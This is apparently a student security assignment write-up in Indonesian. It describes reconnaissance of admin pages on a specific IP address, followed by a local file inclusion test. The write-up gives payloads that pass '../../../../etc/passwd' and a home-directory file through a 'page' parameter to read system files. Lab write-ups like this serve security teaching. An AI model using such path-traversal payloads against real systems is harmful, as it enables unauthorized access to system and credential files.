# cs-assignment-5

## Active Reconaissance

menganalaisa url yang ada pada http://157.245.157.217/ didapatkan

http://157.245.157.217/admin/

http://157.245.157.217/admin/dashboard.php

http://157.245.157.217/admin/tambah_data.php

http://157.245.157.217/admin/dashboard.php?page=jumlah_berita.php

dari hasil reconaissance didapatkan url yang memiliki kerentanan

http://157.245.157.217/admin/dashboard.php?page=jumlah_berita.php

## LFI

Mengecek LFI vulnerability dengan menggunakan payload seperti di bawah

http://157.245.157.217/admin/dashboard.php?page=../../../../etc/passwd

didapatkan hasil sebagai berikut

![image](https://user-images.githubusercontent.com/6330046/187918848-074bb426-0863-4c25-b22a-f1aa62bdf3ce.png)

mendapatkan akses root director kemudian masukkan url berikut

http://157.245.157.217/admin/dashboard.php?page=../../../../home/daffa/lfi.txt

dan didapatkan hasil berikut

![image](https://user-images.githubusercontent.com/6330046/187933306-a3f497c0-2383-4862-b3ef-782beca4fcce.png)

